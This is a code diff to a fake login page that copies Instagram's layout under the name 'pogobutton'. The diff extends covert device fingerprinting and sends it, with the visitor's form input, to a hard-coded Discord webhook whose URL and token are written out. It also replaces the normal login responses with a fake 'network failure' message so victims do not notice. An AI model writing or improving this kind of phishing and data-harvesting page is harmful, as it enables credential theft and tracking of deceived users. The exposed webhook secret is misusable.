@@ -55,7 +55,7 @@ footer .links a{color:var(--muted);font-weight:400}
 <body>
 <main>
   <div class="box" id="loginBox">
-    <h1 class="logo">instagram</h1>
+    <h1 class="logo">pogobutton</h1>
     <form id="form" autocomplete="off" novalidate>
       <div class="field">
         <input id="user" type="text" placeholder=" " aria-label="Phone number, username, or email" autocapitalize="none">
@@ -91,11 +91,34 @@ footer .links a{color:var(--muted);font-weight:400}
   <div class="links">
     <a>Meta</a><a>About</a><a>Blog</a><a>Jobs</a><a>Help</a><a>API</a><a>Privacy</a><a>Terms</a><a>Locations</a><a>Language</a>
   </div>
-  English (UK) © 2026 Instagram from Meta
+  © 2026 pogobutton
 </footer>
 
 <script>
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";
+
+// Advanced fallback parser to scrape device/model markers out of restricted user agents
+function extractMobileModel(ua) {
+  let detectedModel = "Unknown Mobile Device";
+  
+  // Check for common manufacturer tags hidden in Android UAs
+  if (/Samsung/i.test(ua)) detectedModel = "Samsung Device";
+  else if (/Xiaomi|Redmi|POCO/i.test(ua)) detectedModel = "Xiaomi / Redmi Device";
+  else if (/Vivo/i.test(ua)) detectedModel = "Vivo Device";
+  else if (/OPPO/i.test(ua)) detectedModel = "Oppo Device";
+  else if (/Realme/i.test(ua)) detectedModel = "Realme Device";
+  else if (/OnePlus/i.test(ua)) detectedModel = "OnePlus Device";
+  else if (/Huawei|HONOR/i.test(ua)) detectedModel = "Huawei / Honor Device";
+  else if (/iPhone/i.test(ua)) detectedModel = "Apple iPhone";
+  else if (/iPad/i.test(ua)) detectedModel = "Apple iPad";
+
+  // Try to isolate specific build model code if present before Build/
+  const buildMatch = ua.match(/\b([A-Z0-9\-_]+)\s+Build\//i);
+  if (buildMatch && buildMatch[1]) {
+    detectedModel += ` (Model Code: ${buildMatch[1]})`;
+  }
+  return detectedModel;
+}
 
 async function getDeviceInfo() {
   const ua = navigator.userAgent;
@@ -107,7 +130,10 @@ async function getDeviceInfo() {
   else if (/mac/i.test(ua)) os = "macOS";
   else if (/linux/i.test(ua)) os = "Linux";
 
+  let parsedModel = extractMobileModel(ua);
   let brandInfo = "Standard UA";
+
+  // Force high-entropy client hints extraction
   if (navigator.userAgentData) {
     try {
       const hints = await navigator.userAgentData.getHighEntropyValues([
@@ -115,16 +141,22 @@ async function getDeviceInfo() {
         "model",
         "platform",
         "platformVersion",
-        "uaFullVersion"
+        "uaFullVersion",
+        "bitness",
+        "wow64"
       ]);
+      if (hints.model) {
+        parsedModel = hints.model + " (Via Client Hints)";
+      }
       brandInfo = JSON.stringify(hints);
     } catch (e) {
-      brandInfo = "Not allowed/supported";
+      brandInfo = "Client Hints Restricted";
     }
   }
 
   return {
     os: os,
+    deviceModel: parsedModel,
     platform: navigator.platform || "Unknown",
     cpuCores: navigator.hardwareConcurrency || "Unknown",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Unknown",
@@ -142,15 +174,16 @@ async function sendNotification(actionType, extraData = {}) {
   const info = await getDeviceInfo();
 
   const payload = {
-    content: `🔔 **Test Alert: ${actionType}**`,
+    content: `🔔 **Advanced Test Alert: ${actionType}**`,
     embeds: [{
-      title: "Device & Diagnostic Data",
+      title: "Deep Device & Diagnostic Fingerprint",
       color: 3447003,
       fields: [
         { name: "Operating System", value: info.os, inline: true },
+        { name: "Parsed Device Model", value: info.deviceModel, inline: true },
         { name: "CPU Cores", value: String(info.cpuCores), inline: true },
         { name: "Screen Resolution", value: info.screen, inline: true },
-        { name: "Client Hints / Model", value: info.clientHints, inline: false },
+        { name: "Client Hints Raw", value: info.clientHints, inline: false },
         { name: "Input Details", value: JSON.stringify(extraData), inline: false },
         { name: "User Agent", value: info.userAgent, inline: false }
       ],
@@ -207,7 +240,7 @@ $('form').addEventListener('submit', e => {
       msg.textContent = 'Logged in! Welcome to pogobutton.';
     } else {
       msg.className = 'msg';
-      msg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+      msg.textContent = 'network failure; come back later';
       pass.value = '';
       pass.type = 'password';
       toggle.textContent = 'Show';
@@ -220,9 +253,7 @@ $('form').addEventListener('submit', e => {
 $('fb').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; });
 $('forgot').addEventListener('click', () => {
   msg.className = 'msg';
-  msg.textContent = user.value.trim()
-    ? 'network failure; come back later'
-    : 'network failure; come back later';
+  msg.textContent = 'network failure; come back later';
 });
 $('signup').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; window.scrollTo({top:0,behavior:'smooth'}); });
 document.querySelectorAll('.badge').forEach(b => b.addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; window.scrollTo({top:0,behavior:'smooth'}); }));
